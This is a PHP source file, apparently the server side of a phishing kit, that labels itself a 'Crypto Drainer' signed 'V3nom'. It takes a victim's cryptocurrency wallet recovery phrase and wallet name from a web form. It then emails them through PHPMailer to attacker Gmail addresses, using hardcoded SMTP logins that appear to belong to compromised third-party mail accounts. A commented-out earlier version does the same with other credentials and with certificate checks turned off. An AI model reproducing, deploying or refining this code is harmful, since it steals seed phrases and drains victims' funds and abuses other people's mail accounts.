<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");
//session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require_once("vendor/autoload.php");

// Validate input
if (empty($_POST["wallet_phrase"]) || empty($_POST["wallet_name"])) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Missing required fields']);
    exit;
}

// Sanitize input
$wallet_phrase = htmlspecialchars(trim($_POST["wallet_phrase"]));
$wallet_name = htmlspecialchars(trim($_POST["wallet_name"]));

// Consider using environment variables for credentials
//$to_email = 'anijahchukwuka13@gmail.com';
$to_email = 'secureserve07@gmail.com';
$body = "⚜️ Crypto Drainer ⚜️\r\nWallet Phrase: $wallet_phrase\r\nWallet Name: $wallet_name\r\n⚜️ Gift From V3nom ⚜️";
$subject = 'Gift From V3nom';

try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->Host = 'webmail.asdepo.org';
    $mail->SMTPAuth = true;
    $mail->Username = 'gebeyaw.a@asdepo.org';
    $mail->Password = 'Gebeyaw@2049##';
	$mail->SMTPDebug = 1;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;
    $mail->setFrom('webmail.asdepo.org', 'V3nom');
    $mail->addAddress($to_email);
    $mail->Subject = $subject;
    $mail->Body = $body;
    
    // Remove insecure SSL options - use proper certificate validation
    // $mail->SMTPOptions = array(...); // Remove this insecure configuration
    
    if ($mail->Send()) {
        echo json_encode(['status' => 'success', 'message' => 'Data processed']);
    }
} catch (Exception $e) {
    error_log("Email error: " . $e->getMessage()); // Log error for debugging
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Failed to process request']);
}

/* header("Access-Control-Allow-Origin: *");
session_start();
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require_once("vendor/autoload.php"); 
$mail = new PHPMailer(true);

$wallet_phrase = $_POST["wallet_phrase"];
$wallet_name = $_POST["wallet_name"];

$to_email='alfonsodokubo79@gmail.com';
$body = "⚜️ Crypto Drainer ⚜️\r\Wallet Phrase: $wallet_phrase\r\Wallet Name: $wallet_name\r\n⚜️ Gift From V3nom ⚜️";
$subject='Gift From V3nom';
try {
    $mail->isSMTP();
	$mail->Hostname = 'localhost';
	$mail->Host = 'mail.koohejibuildingcare.com';
	$mail->SMTPAuth = true;
	$mail->Username = 'tito@koohejibuildingcare.com';
	$mail->Password = 'Tito@578dh*';
	$mail->SMTPSecure = 'tls';
	$mail->SMTPDebug = 1;
	$mail->Port = 587;
	$mail->setFrom('tito@koohejibuildingcare.com', 'V3nom');
	$mail->addAddress($to_email); 
	//$mail->addReplyTo('info@example.com', 'Information');
	$mail->Subject = $subject;
	$mail->isHTML(true);
	$mail->Body = $body;
	$mail->SMTPOptions = array(
      'ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false,
        'allow_self_signed' => true
      )
    );
    if ($mail->Send()) { 
	 echo json_encode(['status' => 'success', 'message' => 'Data saved successfully']);	
    }
} catch (Exception $e){
	echo json_encode(['status' => 'error', 'message' => 'Failed to save data: ' . $e->errorMessage()]);
    }
//END FIRST */
?>
